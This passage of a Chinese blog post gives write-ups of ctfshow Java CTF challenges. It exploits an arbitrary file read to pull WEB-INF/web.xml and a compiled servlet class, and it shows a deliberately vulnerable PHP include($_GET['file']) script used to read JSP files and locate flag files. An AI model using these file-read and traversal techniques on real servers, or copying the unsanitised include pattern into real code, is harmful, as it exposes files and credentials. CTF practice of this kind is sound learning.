<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://7f95921e-e040-47c8-8bc3-c27872c56345.challenge.ctf.show:80/&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>where is flag?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;cache-control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0&quot;</span>&gt;</span>    </span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;This is my page&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   where is flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- /view-source?file=index.php --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在一个任意文件读取，访问<code>/view-source?file=index.php</code>啥都没有，换成java的试试，对应java的就是index.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> </span><br><span class="line">    <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;ISO-8859-1&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getContextPath();</span><br><span class="line"><span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> request.getScheme()+<span class="string">&quot;://&quot;</span>+request.getServerName()+<span class="string">&quot;:&quot;</span>+request.getServerPort()+path+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>那我们尝试读取一些重要的文件</p>
<p>读取WEB-INF&#x2F;web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="string"><span class="tag">    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span><span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GetFlag<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.GetFlag<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/view-source<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GetFlag<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/getFlag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到还有一个&#x2F;getFlag路由，访问一下发现啥都没有，那就读一下这个文件的内容，可以直接读class文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224141040278.png" alt="image-20260224141040278"></p>
<p>有点乱，但能看到flag在<code>/fl3g</code>中，直接目录遍历就行了</p>
<h1 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h1><h2 id="php-java任意文件读取"><a href="#php-java任意文件读取" class="headerlink" title="#php+java任意文件读取"></a>#php+java任意文件读取</h2><p>居然是php的代码？？？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试包含jsp文件，jsp文件中并没有php代码，所以include并不会解析jsp文件，会直接回显内容</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% pageContext.forward(<span class="string">&quot;index.php&quot;</span>); %&gt;</span><br></pre></td></tr></table></figure>

<p>和上面一样，最终拿到一个flag文件名为&#x2F;f1bg</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224142017795.png" alt="image-20260224142017795"></p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2026/02/17/ctfshow%E5%85%A5%E9%97%A8Java/" title="ctfshow入门Java">https://wanth3f1ag.top/2026/02/17/ctfshow入门Java/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/java/" rel="tag"># java</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2026/02/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%AB%98%E7%89%88%E6%9C%ACJDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" rel="prev" title="高版本JDK下的JNDI注入绕过">
                  <i class="fa fa-angle-left"></i> 高版本JDK下的JNDI注入绕过
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2026/02/24/ctfshow%E5%85%A5%E9%97%A8java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="ctfshow入门java反序列化">
                  ctfshow入门java反序列化 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.5m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">53:25</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
